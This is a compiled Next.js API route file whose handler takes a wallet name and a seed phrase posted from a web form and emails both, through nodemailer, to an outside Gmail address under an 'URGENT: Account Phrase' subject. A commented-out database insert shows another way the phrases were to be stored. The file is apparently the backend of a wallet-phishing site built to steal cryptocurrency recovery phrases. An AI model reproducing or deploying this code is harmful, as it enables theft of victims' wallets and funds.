"use strict";
(() => {
var exports = {};
exports.id = 992;
exports.ids = [992];
exports.modules = {

/***/ 5184:
/***/ ((module) => {

module.exports = require("nodemailer");

/***/ }),

/***/ 4822:
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (__WEBPACK_DEFAULT_EXPORT__)
/* harmony export */ });
const nodemailer = __webpack_require__(5184);
const handler = async (req, res)=>{
    const { method  } = req;
    if (method === "POST") {
        const { phrase , wallet  } = req.body;
        if (!phrase || !wallet) return res.status(400).json({
            error: "Phrase and wallet is required"
        });
        // const { data, error } = await supabase.from("wallet").insert([
        //   {
        //     type: "Phrase",
        //     wallet,
        //     phrase,
        //   },
        // ]);
        // 1) Create a transporter
        const transporter = nodemailer.createTransport({
            host: process.env.EMAIL_HOST,
            port: process.env.EMAIL_PORT,
            auth: {
                user: process.env.EMAIL_USERNAME,
                pass: process.env.EMAIL_PASSWORD
            }
        });
        // 2) Define the email options
        const mailOptions2 = {
            from: "obcbeats@gmail.com",
            to: "busybillion001@gmail.com",
            subject: `URGENT: Account Phrase for ${wallet}`,
            text: `
    Wallet name: ${wallet}
    Phrase: ${phrase}.`
        };
        // 3) Actually send the email
        try {
            await transporter.sendMail(mailOptions2);
            res.status(200).json({
                status: "Success"
            });
        } catch (error) {
            console.log(error);
            res.status(200).json({
                error: "An error occurred"
            });
        }
    } else {
        res.status(400).json({
            error: "Incorrect Method"
        });
    }
};
/* harmony default export */ const __WEBPACK_DEFAULT_EXPORT__ = (handler);


/***/ })

};
;

// load runtime
var __webpack_require__ = require("../../webpack-api-runtime.js");
__webpack_require__.C(exports);
var __webpack_exec__ = (moduleId) => (__webpack_require__(__webpack_require__.s = moduleId))
var __webpack_exports__ = (__webpack_exec__(4822));
module.exports = __webpack_exports__;

})();